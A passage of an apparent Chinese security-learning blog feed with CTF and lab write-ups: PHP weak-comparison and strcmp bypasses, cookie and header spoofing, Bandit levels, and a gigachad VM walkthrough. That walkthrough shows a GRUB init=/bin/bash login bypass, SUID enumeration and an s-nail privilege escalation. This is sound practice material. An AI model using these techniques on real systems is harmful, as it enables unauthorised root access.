    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>本次主题为 <strong>[ACTF2020 新生赛]BackupFile</strong> 与 <strong>[极客大挑战 2019]BuyFlag</strong></p>
<h2 id="使用平台"><a href="#使用平台" class="headerlink" title="使用平台"></a>使用平台</h2><p>chrome<br><a href="https://buuoj.cn/">buuctf</a><br>firefox(搭载hackbar)</p>
<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><p>备份文件的存在<br>cookie查看/修改<br>php数据类型</p>
<h2 id="flag获取过程"><a href="#flag获取过程" class="headerlink" title="flag获取过程"></a>flag获取过程</h2><span id="more"></span>
<p><strong>1.[ACTF2020 新生赛]BackupFile</strong><br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/1.jpg" alt="1"><br>总之 一进去 啥都没有<br>f12注释也没藏<br>我们换个思路 既然题目内容点了题 那么解题方案注定和backup file有关<br>多半只能扫目录了 于是用dirsearch和dirb搜索相关的目录<br>最后发现是潜藏在主页的.bak(每个页面都会有的备份页面)之中<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/2.png" alt="2"><br>👆关于.bak文件的相关解释<br>目录后输入<code>/index.php.bak</code> 会为你自动下载一份文件 以记事本打开<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/3.jpg" alt="3"><br>要我通过输入非纯数字的方式提交$str的内容在PHP中：<br>= = 为弱相等 即当整数和字符串类型相比较时 会先将字符串转化为整数然后再进行比较。比如a=123和b=123a45进行= =比较时。b只会截取前面的整数部分 被转化成123 因此只需要提供参数?key=123即可<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/4.jpg" alt="4"><br>提交flag 结束!</p>
<p><strong>2.[极客大挑战 2019]BuyFlag</strong><br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/5.jpg" alt="5"><br>首先观察主页面 发现右侧菜单栏通往另一个与flag有关的分页面<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/6.jpg" alt="6"><br>首先是线索<br>(如果想要购买flag 你必须得是CUIT的学生之一 还得回答正确的密码)<br>第一关是 <strong>通过CUIT的学生验证</strong><br>我们通过观察网站的网络数据包与cookie 发现一个名为 <strong>user</strong> 的cookie 值为0<br>尝试将0更改为1 成功通过<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/7.jpg" alt="7"><br>第二关是 <strong>输入正确密码</strong><br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/8.jpg" alt="8"><br>这点网站的注释中有相关的代码透露<br>该代码内同样使用了 <strong>弱相等</strong>  需要通过post方式将 <strong>$password</strong> 改为会被整数化为404的字符 我们拟用 <strong>404a</strong> 进行尝试 成功通过<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/9.jpg" alt="9"><br>进入了第三关 <strong>付钱</strong><br>注释中提到过 <strong>post money and password</strong><br>因此投送的数据名应为money<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/10.jpg" alt="10"><br>输入了所需要的100000000元后 却显示数据过长 需要压缩<br>这里有两种方式<br>(1)输入简略的科学计数法 如1e9=1×10的9次方 来使字符压缩<br>(2)利用strcmp函数在判断对象不是字符串时会报错并return0 的特性<br>输入money[]=1 使money变为数组 获取flag<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/11.jpg" alt="11"><br>提交flag 结束!</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>更感觉CTF是一种不同形式的靶机<br>总之我们下次见吧</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机解析-gigachad</title>
    <url>/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>这周的靶机</p>
<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：gigachad</p>
<h2 id="相关知识-工具"><a href="#相关知识-工具" class="headerlink" title="相关知识-工具"></a>相关知识-工具</h2><p>linux单次登录/更改ip设置<br>提权技巧<br>searchsploit</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>首先 我们打开两个机子</p>
<span id="more"></span>
<p>发现同网段扫不到靶机 检查了vmware的设置依旧没有问题<br>那就去靶机那里看看网络设置<br>需要账号密码登录 但我们可以通过更改启动选项来登录<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/2.jpg" alt="1"><br>在开机的这个页面按下e键 进入编辑模式<br>用方向键翻到Linux那行 再按右键一直到该行的末尾 将<code>ro quiet</code>改为<code>rw single init=/bin/bash</code></p>
<blockquote>
<p>rw 代表read write，读写模式。<br>signie init= 代表启动系统后自动运行的程序。<br>/bin/bash 是系统shell的位置。</p>
</blockquote>
<p><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/1.jpg" alt="1"><br>更改完毕后按下ctrl+x来保存 随后你会发现你成功登陆了 按enter来在加载时提前输入命令<br>在linux内挑出了shell后 为了排查扫不到的原因 先执行<code>ip a</code>检查一下<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/3.jpg" alt="3"><br>看来是网卡<code>ens33</code>没有自动分配到ip地址<br>看一下网络的配置 发现配置的网卡名是<code>enp0s3</code> 明显不对 将它改回<code>ens33</code><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/4.jpg" alt="4"></p>
<pre class="line-numbers language-none"><code class="language-none">cat /etc/network/interfaces //查看文件内容
vi /etc/network/interfaces //编辑文件内容
/etc/init.d/networking restart //重启网络<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>改完之后重启网络 通过<code>ip a</code>确认靶机已经联网<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/5.jpg" alt="5"><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/6.jpg" alt="6"><br>这里就可以看到靶机分到的ip了<br>重启靶机后直接在kali进行指定的nmap扫描<br><code>nmap -A -p- 'ip地址'  //-A指综合性扫描</code><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/7.jpg" alt="7"><br>http/80端口开着 ftp/21端口也开着 允许匿名登录 还有个叫chadinfo的文件<br>先从tcp入手<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/8.jpg" alt="8"></p>
<pre class="line-numbers language-none"><code class="language-none">ftp 'ip地址'  //尝试链接ftp服务
ls
get '文件名' //下载文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>获取了叫chadinfo的文件<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/9.jpg" alt="9"><br>解压之后有个txt文件<br>里边说用户名是 <strong>chad</strong>  密码请去/drippinchad.png里找<br>访问网站底下的这个目录<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/10.jpg" alt="10"><br>why yes,this is my favorite place to relax.how could you tell?<br>这个地的地名似乎就是密码 以图搜图一下<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/11.jpg" alt="11"><br>结论：叫做maiden‘s tower<br>尝试用chad与maiden’s tower的各种形式来登录ssh服务<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/12.jpg" alt="12"><br>用<code>maidenstower</code>成功登录<br><img data-src="/13.jpg" alt="13"><br>目录底下就有flag1<br>flag2多半是需要提权了</p>
<blockquote>
<p>拿到低权限的shell后经常做的几件事：<br>1、看系统发行版本 lsb_release -a<br>2、查看内核版本 uname -a<br>3、当前用户权限<br>4、列举suid文件 `find / -perm -u=f 2&gt;/dev/null<br>5、查看已经安装的包、运行的服务，过期版本可能会存在漏洞</p>
<p>find / -perm -u=s -type f -exec ls -la {} ; 2&gt;/dev/null<br>-perm 是代表按指定权限搜索。<br>-u=s 其中u代表当前用户的权限，s代表suid权限，-号代表至少需要满足指定的权限，可以有更多的权限，但是不能少了这个指定权限。关于这个参数更详细的内容可以参考：<a href="https://blog.csdn.net/weixin_44061169/article/details/105784760">https://blog.csdn.net/weixin_44061169/article/details/105784760</a><br>-tpye 代表搜索指定的类型，f代表文件。<br>-exec 代表搜索完后执行指定的命令，其中{}代表所搜到的结果，命令以;为结束标识。更详细内容可以参考：<a href="https://www.pianshen.com/article/86691137271/">https://www.pianshen.com/article/86691137271/</a><br>2&gt;/dev/null 代表将不显示错误信息</p>
<p>参考：<a href="https://blog.csdn.net/rpsate/article/details/119494515">https://blog.csdn.net/rpsate/article/details/119494515</a></p>
</blockquote>
<p><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/14.jpg" alt="14"><br>发现s-nail，尝试利用该程序提权<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/15.jpg" alt="15"><br>寻找漏洞<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/16.jpg" alt="16"><br>将提权文件复制进靶机<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/17.jpg" alt="17"><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/18.jpg" alt="18"><br>加权 运行 要多试几次 最后成功提权<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/19.jpg" alt="19"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最近有点忙着备考就不写总结了<br>嘻嘻</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF实战相关2</title>
    <url>/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="CTF实战相关2"><a href="#CTF实战相关2" class="headerlink" title="CTF实战相关2"></a>CTF实战相关2</h1><p>以web类的CTF作为范本的话<br>应该做的</p>
<blockquote>
<p>1.检查网页元素  寻找相关提示<br>2.通过网络查看http标头(header)<br>3.burp扫描/hackbar投送信息/更改cookie<br>4.php相关知识</p>
</blockquote>
<p>还有标头会传达的 可更改的两个信息 X-Forwarded-For 与 Referer<br>简单来说<br>X-Forwarded-For表示访问该网址的ip 例如127.0.0.1即为本地访问<br>Referer代表了你是从哪个网页来——例如<code>http://www.google.com</code></p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>（注：这里图片只附上结果 主要是不想再开环境了）<br>使用了谷歌浏览器的f12功能 burpsuite 与 firefox的hackbar插件</p>
<span id="more"></span>

<h4 id="1-BugKu-Web-计算器"><a href="#1-BugKu-Web-计算器" class="headerlink" title="1.BugKu-Web-计算器"></a>1.BugKu-Web-计算器</h4><p>检查html元素 发现页面中的答题框只允许输一个数字 无法正确回答<br>更改input框中限制的文字上限 成功作答 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/1.jpg" alt="1"></p>
<h4 id="2-攻防世界-Web新手区-disabled-button"><a href="#2-攻防世界-Web新手区-disabled-button" class="headerlink" title="2.攻防世界-Web新手区- disabled_button"></a>2.攻防世界-Web新手区- disabled_button</h4><p>检查html元素 发现页面中显示“一个不能按的按钮”  多半按下后才能显示flag<br>删去按钮属性框中的<code>disabled</code> 按下按钮 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/2.jpg" alt="2"></p>
<h4 id="3-BugKu-Web-头等舱"><a href="#3-BugKu-Web-头等舱" class="headerlink" title="3.BugKu-Web-头等舱"></a>3.BugKu-Web-头等舱</h4><p>检查页面 f12发现无标注隐藏元素 根据题目名“头等舱” 通过f12-网络<br>f5刷新后从网络标头中找到flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/3.jpg" alt="3"></p>
<h4 id="4-攻防世界-Web-baby-web"><a href="#4-攻防世界-Web-baby-web" class="headerlink" title="4.攻防世界-Web-baby_web"></a>4.攻防世界-Web-baby_web</h4><p>检查页面 发现无隐藏元素 根据作者提示<code>想想主页面是什么</code>访问目录index.php<br>然而index.php也无任何隐藏<br>最终 通过f12-网络 f5刷新后从该页面的网络标头中找到flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/4.jpg" alt="4"></p>
<h4 id="5-（BUUCTF）极客大挑战-2019-Havefun"><a href="#5-（BUUCTF）极客大挑战-2019-Havefun" class="headerlink" title="5.（BUUCTF）极客大挑战-2019-Havefun"></a>5.（BUUCTF）极客大挑战-2019-Havefun</h4><p>检查页面 元素中有标注代码 该页面GET方式接收cat参数<br>当cat=dog时会发生什么 于是传参 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/5.jpg" alt="5"></p>
<h4 id="6-攻防世界-Web新手区-get-post"><a href="#6-攻防世界-Web新手区-get-post" class="headerlink" title="6.攻防世界-Web新手区-get_post"></a>6.攻防世界-Web新手区-get_post</h4><p>检查页面 要求你通过GET方式提交a=1<br>提交后又叫你通过POST方式提交b=2<br>照做即可 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/6.jpg" alt="6"></p>
<h4 id="7-BugKu-Web-程序员本地网站"><a href="#7-BugKu-Web-程序员本地网站" class="headerlink" title="7.BugKu-Web-程序员本地网站"></a>7.BugKu-Web-程序员本地网站</h4><p>检查页面 页面显示<code>请以本地ip访问</code><br>使用burpsuite监听该网页 并将X-Forwarded-For标头改为127.0.0.1<br>获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/7.jpg" alt="7"></p>
<h4 id="8-BugKu-Web-你从哪里来"><a href="#8-BugKu-Web-你从哪里来" class="headerlink" title="8.BugKu-Web-你从哪里来"></a>8.BugKu-Web-你从哪里来</h4><p>检查页面 页面显示<code>are you from google？</code><br>判定与referer标头有关 通过burpsuite监听页面<br>将referer标头改为<code>http://www.google.com</code><br>获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/8.jpg" alt="8"></p>
<h4 id="9-攻防世界-Web新手区-xff-referrer"><a href="#9-攻防世界-Web新手区-xff-referrer" class="headerlink" title="9.攻防世界-Web新手区-xff_referrer"></a>9.攻防世界-Web新手区-xff_referrer</h4><p>检查页面 页面显示<code>ip必须为123.123.123</code><br>使用burpsuite监听该网页 并将X-Forwarded-For标头改为123.123.123.123<br>页面变为“必须来自<code>https://www.google.com</code>”<br>通过burpsuite监听页面 将referer标头改为<code>http://www.google.com</code><br>获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/9.jpg" alt="9"></p>
<h4 id="10-攻防世界-Web新手区-cookie"><a href="#10-攻防世界-Web新手区-cookie" class="headerlink" title="10.攻防世界-Web新手区-cookie"></a>10.攻防世界-Web新手区-cookie</h4><p>检查页面 页面显示“你知道什么是cookie吗？”<br>f12-网络 查看页面cookie 发现信息<code>look here=cookie.php</code><br>于是访问cookie.php 发现信息 <strong>see the http response</strong><br>查看标头 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/10.jpg" alt="10"></p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>OverTheWire-bandit解析</title>
    <url>/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="友情提示"><a href="#友情提示" class="headerlink" title="友情提示"></a>友情提示</h1><p>理论来说 这个网页的网站说了不允许剧透或是writeup<br>但这大多是为了方便我自身复习留下的资料<br>因此我不会直接在文中提供flag 只会写出方法与代码</p>
<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p><a href="https://overthewire.org/wargames/bandit/bandit0.html">网页链接</a><br>该网页类似一个在线靶场 需要你登录它所提供的账号密码登录其ssh服务进行一场小游戏<br>我使用了MobaXterm来登陆/输入指令</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><h2 id="level-0-准备"><a href="#level-0-准备" class="headerlink" title="level 0/准备"></a>level 0/准备</h2><blockquote>
<p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.</p>
</blockquote>
<p>页面描述为指示你链接ssh服务 并给予了对应ip 端口 账号 密码<br>一旦登录成功 便可进入level0→level1的页面<br>关于登录 我们先打开MobaXterm 点击左上角的 <strong>Session</strong> 选择ssh<br>输入ip地址<code>bandit.labs.overthewire.org</code>与端口2220<br><img data-src="/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>确认后左边的User sessions便会多出一个连接 右键 Edit session 会进入相同的页面<br><img data-src="/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>先点击① 会出来账号管理器 点击②来新建一个 输入bandit0与bandit0<br>保存好后在登陆前勾选左边的 <code>Specify username</code> 选择对应账号名即可快速登陆<br>注：使用MobaXterm的该功能必须设定一个高级密码 请不要忽视它跳出的窗口<br>每道题里的flag相当于下一题的账号密码<br>也就是说下道题的结论是 账号 <strong>bandit(题号)</strong> 与 密码 <strong>flag值</strong><br>这些即为前提 接下来正式入手</p>
<span id="more"></span>

<h2 id="level1-起始"><a href="#level1-起始" class="headerlink" title="level1/起始"></a>level1/起始</h2><blockquote>
<h1 id="Bandit-Level-0-→-Level-1"><a href="#Bandit-Level-0-→-Level-1" class="headerlink" title="Bandit Level 0 → Level 1"></a>Bandit Level 0 → Level 1</h1><h2 id="Level-Goal"><a href="#Level-Goal" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>readme</strong> located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.</p>
<h2 id="Commands-you-may-need-to-solve-this-level"><a href="#Commands-you-may-need-to-solve-this-level" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p>
</blockquote>
<p>根据题目描述 在主目录下有名为readme的文件 查看该文件内容即可获取密码<br>既然是在主目录下 其实连ls都省了 直接 <code>cat readme</code>即可获取flag值</p>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><blockquote>
<h1 id="Bandit-Level-1-→-Level-2"><a href="#Bandit-Level-1-→-Level-2" class="headerlink" title="Bandit Level 1 → Level 2"></a>Bandit Level 1 → Level 2</h1><h2 id="Level-Goal-1"><a href="#Level-Goal-1" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>-</strong> located in the home directory</p>
<h2 id="Commands-you-may-need-to-solve-this-level-1"><a href="#Commands-you-may-need-to-solve-this-level-1" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p>
</blockquote>
<p>此关的目的是读取一个名为-的文件<br>由于-的名称与root根目录相同 直接cat或者加引号都无法读取<br>因此需要转为绝对路径<code>./-</code><br>输入<code>cat ./-</code>来获取flag值</p>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote>
<h1 id="Bandit-Level-2-→-Level-3"><a href="#Bandit-Level-2-→-Level-3" class="headerlink" title="Bandit Level 2 → Level 3"></a>Bandit Level 2 → Level 3</h1><h2 id="Level-Goal-2"><a href="#Level-Goal-2" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>spaces in this filename</strong> located in the home directory</p>
<h2 id="Commands-you-may-need-to-solve-this-level-2"><a href="#Commands-you-may-need-to-solve-this-level-2" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p>
</blockquote>
<p>这关是考察通过cat获取文件名中有空格的文件内容<br>用引号来转义空格 使系统识别后部分为一个整体即可<br><code>cat ‘spaces in this filename’</code></p>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><blockquote>
<h1 id="Bandit-Level-3-→-Level-4"><a href="#Bandit-Level-3-→-Level-4" class="headerlink" title="Bandit Level 3 → Level 4"></a>Bandit Level 3 → Level 4</h1><h2 id="Level-Goal-3"><a href="#Level-Goal-3" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a hidden file in the <strong>inhere</strong> directory.</p>
<h2 id="Commands-you-may-need-to-solve-this-level-3"><a href="#Commands-you-may-need-to-solve-this-level-3" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p>
</blockquote>
<p>题目描述有一个被隐藏的文件藏在了inhere目录中 叫我们尝试读取<br>那就使用ls的-a附加项来查看隐藏文件<br>使用cd来切换目录</p>
<pre class="line-numbers language-none"><code class="language-none">cd inhere //切换至inhere目录
ls -al //列出所有文件 显示隐藏文件并显示详细信息
cat .hidden //查看文件内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><blockquote>
<h1 id="Bandit-Level-4-→-Level-5"><a href="#Bandit-Level-4-→-Level-5" class="headerlink" title="Bandit Level 4 → Level 5"></a>Bandit Level 4 → Level 5</h1><h2 id="Level-Goal-4"><a href="#Level-Goal-4" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the only human-readable file in the <strong>inhere</strong> directory. Tip: if your terminal is messed up, try the “reset” command.</p>
<h2 id="Commands-you-may-need-to-solve-this-level-4"><a href="#Commands-you-may-need-to-solve-this-level-4" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p>
</blockquote>
<p>inhere目录中唯一可读的文件才是我们追求的答案<br>我们查看下边提示中的命令列表 发现了file命令可用<br>经过搜索得知 Linux file命令用于辨识文件类型<br>注：文件名前加了- 无法正常读取 需要使用相对路径</p>
<pre class="line-numbers language-none"><code class="language-none">file ./* //显示同个目录下的所有文件的文件类型
观察结果：
 ./*
./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>很明显 只有-file07为ASII text形式 只需读取即可</p>
<pre class="line-numbers language-none"><code class="language-none">cat ./-file07<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><blockquote>
<h1 id="Bandit-Level-5-→-Level-6"><a href="#Bandit-Level-5-→-Level-6" class="headerlink" title="Bandit Level 5 → Level 6"></a>Bandit Level 5 → Level 6</h1><h2 id="Level-Goal-5"><a href="#Level-Goal-5" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file somewhere under the <strong>inhere</strong> directory and has all of the following properties:</p>
<ul>
<li>human-readable</li>
<li>1033 bytes in size</li>
<li>not executable</li>
</ul>
</blockquote>
<p>inhere目录中的指定文件存有flag 以下为flag文件的特征：<br>可读性 大小1033字节 无法运行<br>这里我们使用find命令的附加项即可</p>
<pre class="line-numbers language-none"><code class="language-none">find [路径] [匹配条件] [动作]
-name pattern：按文件名查找，支持使用通配符 * 和 ?。
-type type：按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。
-size [+-]size[cwbkMG]：按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。
-mtime days：按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。
-user username：按文件所有者查找。
-group groupname：按文件所属组查找。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>进入inhere目录 </p>
<pre class="line-numbers language-none"><code class="language-none">ls -al
total 88
drwxr-x--- 22 root bandit5 4096 Oct  5 06:19 .
drwxr-xr-x  3 root root    4096 Oct  5 06:19 ..
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere00
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere01
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere02
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere03
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere04
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere05
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere06
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere07
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere08
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere09
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere10
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere11
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere12
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere13
